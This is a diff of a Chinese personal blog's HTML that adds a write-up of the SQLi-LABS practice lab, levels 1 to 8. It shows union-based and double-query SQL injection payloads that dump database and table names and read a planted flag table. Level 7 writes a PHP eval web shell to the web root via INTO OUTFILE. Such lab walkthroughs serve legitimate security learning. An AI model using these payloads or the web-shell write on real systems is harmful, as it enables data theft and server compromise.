@@ -110,17 +110,18 @@
 		}
 	})();
 </script>
-  <meta name="description" content="辣鸡CTF选手，渣Web，逆向只会F5的渣渣">
+  <meta name="description" content="为了方便，我在sqli-labs的数据库里加了一个flag表，内容如下    id flag md5     1 flag{Ur_w31c0M3_59Li} 5741ec4b77346399c8ff2428ac49b937    目标就是通过注入读到这个表里的数据 Page-1Less-1 Error Based- String题目提示（后面一样的就省略了）： 1Please input the">
 <meta name="keywords" content="Hexo, willv, 信息安全, hack, 技术, 博客">
 <meta property="og:type" content="website">
-<meta property="og:title" content="时光">
-<meta property="og:url" content="https://willv.cn/tags/python/index.html">
+<meta property="og:title" content="SQLi-LABS">
+<meta property="og:url" content="https://willv.cn/writeups/sqli-labs/index.html">
 <meta property="og:site_name" content="时光">
-<meta property="og:description" content="辣鸡CTF选手，渣Web，逆向只会F5的渣渣">
+<meta property="og:description" content="为了方便，我在sqli-labs的数据库里加了一个flag表，内容如下    id flag md5     1 flag{Ur_w31c0M3_59Li} 5741ec4b77346399c8ff2428ac49b937    目标就是通过注入读到这个表里的数据 Page-1Less-1 Error Based- String题目提示（后面一样的就省略了）： 1Please input the">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-07-21T12:05:33.262Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="时光">
-<meta name="twitter:description" content="辣鸡CTF选手，渣Web，逆向只会F5的渣渣">
+<meta name="twitter:title" content="SQLi-LABS">
+<meta name="twitter:description" content="为了方便，我在sqli-labs的数据库里加了一个flag表，内容如下    id flag md5     1 flag{Ur_w31c0M3_59Li} 5741ec4b77346399c8ff2428ac49b937    目标就是通过注入读到这个表里的数据 Page-1Less-1 Error Based- String题目提示（后面一样的就省略了）： 1Please input the">
 
 
 
@@ -130,7 +131,7 @@
 
   
   
-  <link rel="canonical" href="https://willv.cn/tags/python/">
+  <link rel="canonical" href="https://willv.cn/writeups/sqli-labs/">
 
 
 
@@ -140,7 +141,7 @@
   };
 </script>
 
-  <title>标签: python | 时光</title>
+  <title>SQLi-LABS | 时光</title>
   
 
 
@@ -198,7 +199,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -270,7 +271,7 @@
         
         
           
-          <li class="menu-item menu-item-tags menu-item-active">
+          <li class="menu-item menu-item-tags">
 
     
     
@@ -321,7 +322,7 @@
         
         
           
-          <li class="menu-item menu-item-writeup">
+          <li class="menu-item menu-item-writeup menu-item-active">
 
     
     
@@ -461,57 +462,189 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>python<small>标签</small>
-        </h2>
-      </div>
+<h2 class="post-title" itemprop="name headline">SQLi-LABS
 
+</h2>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
       
         
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-          <a class="post-title-link" href="/2020/03/04/python-timeout-retry/" itemprop="url">
+          
             
-              <span itemprop="name">python的timeout和retry解决urlopen可能出现的卡死问题</span>
-            
-          </a>
+          
+          
+            <li><a href="/writeups/">WRITEUPS</a></li>
+          
         
-      </h3>
+      
+    
+      
+      
+        
+          <li>SQLI-LABS</li>
+        
+      
+    
+      
+      
+    
+  </ul>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2020-03-04T10:05:35+08:00" content="2020-03-04">
-          03-04
-        </time>
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>为了方便，我在sqli-labs的数据库里加了一个flag表，内容如下</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">id</th>
+<th style="text-align:center">flag</th>
+<th style="text-align:center">md5</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td style="text-align:center">flag{Ur_w31c0M3_59Li}</td>
+<td style="text-align:center">5741ec4b77346399c8ff2428ac49b937</td>
+</tr>
+</tbody>
+</table>
+<p>目标就是通过注入读到这个表里的数据</p>
+<h2 id="Page-1"><a href="#Page-1" class="headerlink" title="Page-1"></a>Page-1</h2><h3 id="Less-1-Error-Based-String"><a href="#Less-1-Error-Based-String" class="headerlink" title="Less-1 Error Based- String"></a>Less-1 Error Based- String</h3><p>题目提示（后面一样的就省略了）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input the ID as parameter with numeric value</span><br></pre></td></tr></table></figure>
+<p>输入<code>?id=1&#39;</code>报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>存在注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or &apos;1&apos;=&apos;1	正常</span><br><span class="line">1&apos; or &apos;1&apos;=&apos;2	无结果</span><br><span class="line">1&apos; order by 3; --+	表中有3列数据</span><br><span class="line">0&apos; union select 1,2,3; --+	2、3列数据显示在网页上</span><br><span class="line">0&apos; union select 1,database(),user(); --+	数据库名为security，用户为root@localhost</span><br><span class="line">0&apos; union select 1,1,group_concat(schema_name) from information_schema.schemata; --+	列出所有数据库</span><br><span class="line">0&apos; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database(); --+	列出当前数据库所有表</span><br><span class="line">0&apos; union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;; --+	列出flag表所有列</span><br><span class="line">id=0&apos; union select 1,flag,md5 from flag; --+ 读取flag</span><br></pre></td></tr></table></figure>
+<h3 id="Less-2-Error-Based-Intiger"><a href="#Less-2-Error-Based-Intiger" class="headerlink" title="Less-2 Error Based- Intiger"></a>Less-2 Error Based- Intiger</h3><p>输入<code>?id=1&#39;</code>报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>存在注入。</p>
+<p>输入<code>1&#39; or &#39;1&#39;=&#39;1</code>报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos; or &apos;1&apos;=&apos;1 LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>数字型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1	正常</span><br><span class="line">1 and 1=2	无结果</span><br><span class="line">1 order by 3; --+	表中有3列数据</span><br><span class="line">0 union select 1,2,3; --+ 2、3列数据显示在网页上</span><br><span class="line">0 union select 1,database(),group_concat(schema_name) from information_schema.schemata; --+	列出当前数据库和所有数据库</span><br><span class="line">0 union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database(); --+	列出当前数据库所有表</span><br><span class="line">0 union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;; --+	列出flag表所有列</span><br><span class="line">0 union select 1,flag,md5 from flag; --+	读取flag</span><br></pre></td></tr></table></figure>
+<h3 id="Less-3-Error-Based-String-with-Twist"><a href="#Less-3-Error-Based-String-with-Twist" class="headerlink" title="Less-3 Error Based- String (with Twist)"></a>Less-3 Error Based- String (with Twist)</h3><p>输入<code>?id=1&#39;</code>报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>存在注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&apos; or &apos;1&apos;=&apos;1	正常</span><br><span class="line">1&apos; or &apos;1&apos;=&apos;2	无结果</span><br></pre></td></tr></table></figure>
+<p>后面的注入语句发现无法正常执行，根据报错猜测需要闭合括号。继续构造如下语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&apos;) order by 3; --+	表中有3列数据</span><br><span class="line">0&apos;) union select 1,2,3; --+ 2、3列数据显示在网页上</span><br><span class="line">0&apos;) union select 1,database(),group_concat(schema_name) from information_schema.schemata; --+	列出当前数据库和所有数据库</span><br><span class="line">0&apos;) union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database(); --+	列出当前数据库所有表</span><br><span class="line">0&apos;) union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;; --+	列出flag表所有列</span><br><span class="line">0&apos;) union select 1,flag,md5 from flag; --+	读取flag</span><br></pre></td></tr></table></figure>
+<h3 id="Less-4-Error-Based-DoubleQuotes-String"><a href="#Less-4-Error-Based-DoubleQuotes-String" class="headerlink" title="Less-4 Error Based- DoubleQuotes String"></a>Less-4 Error Based- DoubleQuotes String</h3><p>使用<code>&#39; --+ )</code>等都无法触发报错，输入<code>\</code>报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&quot;1\&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>猜测使用了双引号而不是单引号进行闭合。</p>
+<p>注入语句构造如下（中间猜测数据库数据表省略，语句都差不多，也不解释了）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&quot;) order by 3; --+</span><br><span class="line">0&quot;) union select 1,1,group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;; --+</span><br><span class="line">0&quot;) union select 1,flag,md5 from flag; --+</span><br></pre></td></tr></table></figure>
+<h3 id="Less-5-Double-Query-Single-Quotes-String"><a href="#Less-5-Double-Query-Single-Quotes-String" class="headerlink" title="Less-5 Double Query- Single Quotes- String"></a>Less-5 Double Query- Single Quotes- String</h3><p>这道题和前面不太一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=0	无结果</span><br><span class="line">id=1	You are in...........</span><br><span class="line">id=1&apos;	报错</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>双查询注入，具体原理见<a href="https://willv.cn/2020/07/18/sqli-handbook/#%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">这里</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a; --+ 爆出数据库名</span><br><span class="line">0&apos; union select 1,count(*), concat((select table_name from information_schema.tables where table_schema=database() LIMIT 1,1), floor(rand()*2))as a from information_schema.tables group by a; --+ 找到flag表</span><br><span class="line">0&apos; union select 1,count(*), concat((SELECT COLUMN_NAME FROM information_schema.COLUMNS where TABLE_NAME=&apos;flag&apos; LIMIT 0,1), floor(rand()*2))as a from information_schema.columns group by a; --+ 依次爆出列名</span><br><span class="line">0&apos; union select 1,count(*), concat((select flag from security.flag LIMIT 0,1), floor(rand()*2))as a from information_schema.TABLES group by a; --+ 爆出flag</span><br></pre></td></tr></table></figure>
+<h3 id="Less-6-Double-Query-Double-Quotes-String"><a href="#Less-6-Double-Query-Double-Quotes-String" class="headerlink" title="Less-6 Double Query- Double Quotes- String"></a>Less-6 Double Query- Double Quotes- String</h3><p>这道题其实和5一样，把单引号换成双引号就行了，最后的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&quot; union select 1,count(*), concat((select flag from security.flag LIMIT 0,1), floor(rand()*2))as a from information_schema.`TABLES` group by a; --+</span><br></pre></td></tr></table></figure>
+<h3 id="Less-7-Dump-into-Outfile"><a href="#Less-7-Dump-into-Outfile" class="headerlink" title="Less-7 Dump into Outfile"></a>Less-7 Dump into Outfile</h3><p>into outfile写文件</p>
+<p>这里需要注意，可能需要提前配置一下mysql的权限。启动mysql的时候默认使用了–secure-file-priv这个参数，限制LOAD DATA INFILE或者SELECT INTO OUTFILE之类文件的目录位置。</p>
+<p>可以使用<code>SELECT @@global.secure_file_priv;</code>或<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看当前设置的路径。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）NULL，表示禁止。</span><br><span class="line">（2）如果value值有文件夹目录，则表示只允许该目录下文件（PS：测试子目录也不行）。</span><br><span class="line">（3）如果为空，则表示不限制目录。</span><br></pre></td></tr></table></figure>
+<p>（1）方案一：</p>
+<p>把导入文件放入secure-file-priv目前的value值对应路径即可。</p>
+<p>（2）方案二：</p>
+<p>把secure-file-priv的value值修改为准备导入文件的放置路径。</p>
+<p>（3）方案三：修改配置</p>
+<p>去掉导入的目录限制。可修改mysql配置文件（Windows下为my.ini, Linux下的my.cnf），在[mysqld]下面，查看是否有：</p>
+<p><code>secure_file_priv =</code></p>
+<p>如上这样一行内容，如果没有，则手动添加。如果存在如下行：</p>
+<p><code>secure_file_priv = /home</code></p>
+<p>这样一行内容，表示限制为/home文件夹。而如下行：</p>
+<p><code>secure_file_priv =</code></p>
+<p>这样一行内容，表示不限制目录，等号一定要有，否则mysql无法启动。</p>
+<p>修改完配置文件后，重启mysql生效。</p>
+<p>除了mysql的限制，Linux可能也会限制文件写入。我额外在网站目录下新建了一个test文件夹并用chown把权限给了mysql。</p>
+<p>这道题没什么注入技巧，需要注意要闭合两个括号，其他就是一句话木马写入了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;)) union select 1,2,&quot;&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;&quot; into outfile &quot;/opt/lampp/htdocs/test/pass.php&quot;; --+</span><br></pre></td></tr></table></figure>
+<p>一句话木马连接搞定</p>
+<h3 id="Less-8-Blind-Boolian-Single-Quotes-String"><a href="#Less-8-Blind-Boolian-Single-Quotes-String" class="headerlink" title="Less-8 Blind- Boolian- Single Quotes- String"></a>Less-8 Blind- Boolian- Single Quotes- String</h3><p>这道题是基于bool的盲注。</p>
+
+        
       </div>
-
-    </header>
-  </article>
-
-
+      
+      
       
     </div>
+    
 
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          
+            
+          
+          
+            <li><a href="/writeups/">WRITEUPS</a></li>
+          
+        
+      
+    
+      
+      
+        
+          <li>SQLI-LABS</li>
+        
+      
+    
+      
+      
+    
+  </ul>
+
+
+    
+    
+    
   </div>
-  
-  
-  
-
-  
-
 
 
           </div>
           
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+      </div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -531,8 +664,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -687,6 +829,23 @@
       </div>
 
       
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Page-1"><span class="nav-number">1.</span> <span class="nav-text">Page-1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1-Error-Based-String"><span class="nav-number">1.1.</span> <span class="nav-text">Less-1 Error Based- String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2-Error-Based-Intiger"><span class="nav-number">1.2.</span> <span class="nav-text">Less-2 Error Based- Intiger</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-3-Error-Based-String-with-Twist"><span class="nav-number">1.3.</span> <span class="nav-text">Less-3 Error Based- String (with Twist)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-4-Error-Based-DoubleQuotes-String"><span class="nav-number">1.4.</span> <span class="nav-text">Less-4 Error Based- DoubleQuotes String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-5-Double-Query-Single-Quotes-String"><span class="nav-number">1.5.</span> <span class="nav-text">Less-5 Double Query- Single Quotes- String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-6-Double-Query-Double-Quotes-String"><span class="nav-number">1.6.</span> <span class="nav-text">Less-6 Double Query- Double Quotes- String</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-7-Dump-into-Outfile"><span class="nav-number">1.7.</span> <span class="nav-text">Less-7 Dump into Outfile</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-8-Blind-Boolian-Single-Quotes-String"><span class="nav-number">1.8.</span> <span class="nav-text">Less-8 Blind- Boolian- Single Quotes- String</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
 
       
 
@@ -818,6 +977,10 @@
 
 
   
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
 
   
 
@@ -843,9 +1006,63 @@
   
   
 
+<script>
+  var disqus_config = function() {
+    this.page.url = "https://willv.cn/writeups/sqli-labs/index.html";
+    this.page.identifier = "writeups/sqli-labs/index.html";
+    this.page.title = 'SQLi-LABS';
+    };
+  function loadComments() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://wwillv.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', '' + +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  
+    $(function() {
+      var offsetTop = $('#comments').offset().top - $(window).height();
+      if (offsetTop <= 0) {
+        // load directly when there's no a scrollbar
+        loadComments();
+      } else {
+        $(window).on('scroll.disqus_scroll', function() {
+          // offsetTop may changes because of manually resizing browser window or lazy loading images.
+          var offsetTop = $('#comments').offset().top - $(window).height();
+          var scrollTop = $(window).scrollTop();
+
+          // pre-load comments a bit? (margin or anything else)
+          if (offsetTop - scrollTop < 60) {
+            $(window).off('.disqus_scroll');
+            loadComments();
+          }
+        });
+      }
+    });
+  
+</script>
 
 
 
+
+
+  
+    
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js"></script>
+
+<script>
+  var dsqjs = new DisqusJS({
+    api: 'https://disqus.skk.moe/disqus/' || 'https://disqus.com/api/',
+    apikey: 'BOmm2MYh9jOZ82WCk1flJ5KDNWQWEyyQH0YKHEgJ1wqWW4zTuHFxlOOlmgreU34u',
+    shortname: 'wwillv'
+  });
+</script>
+
+  
 
 
   
